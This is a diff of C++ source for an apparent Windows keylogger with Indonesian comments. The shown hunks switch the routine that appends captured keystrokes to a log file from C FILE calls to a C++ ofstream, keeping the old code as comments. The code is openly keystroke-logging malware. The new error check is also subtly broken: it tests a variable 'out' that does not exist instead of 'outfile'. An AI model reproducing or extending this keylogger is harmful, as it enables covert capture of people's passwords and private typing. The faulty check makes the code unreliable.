@@ -1,5 +1,7 @@
 #include <iostream>
+#include <fstream>
 #include <windows.h>
+#include <cstdlib>
 #include <string>
 /*
 	PENJElASAN PENGGUNAAN SYSTEM CALLS WINDOWS API (WINAPI) YANG DIGUNAKAN
@@ -110,13 +112,26 @@ void olahMasukan(int in, bool tCtrl, bool tAlt, bool tShift, bool tCapslock){
 // mulai merekam masukan keyboard
 void mulaiRekam(char *namaBerkas){
 	
-	FILE *file;
+	/* ------------------------------
+	* Standard C
+	* FILE *file;
 	
-	// membuka berkas
-	if ((file = fopen(namaBerkas, "a+"))==NULL) {
-		printf("Tidak bisa membuka file.\n");
-        exit(1);
+	* // membuka berkas
+	* if ((file = fopen(namaBerkas, "a+"))==NULL) {
+	*	printf("Tidak bisa membuka file.\n");
+        * exit(1);
+	* }
+	* -------------------------------- */
+	
+	// Standard C++
+	ofstream outfile;
+	outfile.open(namaBerkas, ios::out | ios::app);
+	// Membuka file dengan append mode.
+	if (!out) {
+		cerr << "Tidak bisa membuka file!" <<endl;
+		abort();
 	}
+	
 
 	// vkCode adalah variabel yang menyimpan keyCode yang diinput pengguna
 	int vkCode = -1;
@@ -164,11 +179,17 @@ void mulaiRekam(char *namaBerkas){
 	}
 	
 	// menulis rekaman/log
-	fputs(dataRekam.c_str(), file); 
 	
+	/*--------------------------- 
+	* bukan standard cpp 
+	* fputs(dataRekam.c_str(), file); 
+	*--------------------------- */
+	
+	//menulis string yang ada di dataRekam ke outfile.
+	outfile << dataRekam;
+
 	// menutup berkas
-	fclose(file);
-	
+	outfile.close();
 }
 
 int main(){
